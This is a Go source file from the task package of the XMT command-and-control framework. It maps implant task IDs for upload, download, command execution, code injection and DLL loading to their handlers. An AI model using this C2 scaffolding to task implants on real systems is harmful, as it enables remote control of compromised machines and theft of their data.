package task

import (
	"context"

	"github.com/iDigitalFlame/xmt/c2/task/wintask"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
)

// Built in Task Message ID Values
//
// TvRefresh      - 192
// TvUpload       - 193
// TvDownload     - 194
// TvExecute      - 195
// TvCode         - 196
const (
	TvRefresh  uint8 = 0xC0
	TvDownload uint8 = 0xC1
	TvUpload   uint8 = 0xC2
	TvExecute  uint8 = uint8(Execute)
	TvCode     uint8 = 0xC4
)

// Mappings is an fixed size array that contains the Tasker mappings for each ID value. Values that are less than 22
// are ignored. Adding a mapping to here will allow it to be executed via the client Scheduler.
var Mappings = [256]Tasker{
	// Built-in Mappings
	TvDownload: simpleTask(TvDownload),
	TvUpload:   simpleTask(TvUpload),
	TvCode:     Inject,
	TvExecute:  Execute,
	TvRefresh:  simpleTask(TvRefresh),

	// WinTask related Mappings
	wintask.DLLTask: wintask.DLLTask,
}

type simpleTask uint8

// Tasker is an interface that will be tasked with executing a Job and will return an error or a resulting
// Packet with the resulting data. This function is NOT responsible with writing any error codes, the parent caller
// will handle that.
type Tasker interface {
	Thread() bool
	Do(context.Context, *com.Packet) (*com.Packet, error)
}

func (t simpleTask) Thread() bool {
	return t != 0xC0
}
func (t simpleTask) Do(x context.Context, p *com.Packet) (*com.Packet, error) {
	switch uint8(t) {
	case TvUpload:
		return upload(x, p)
	case TvDownload:
		return download(x, p)
	case TvRefresh:
		if err := device.Local.Refresh(); err != nil {
			return nil, err
		}
		n := new(com.Packet)
		device.Local.MarshalStream(n)
		return n, nil
	}
	return nil, nil
}
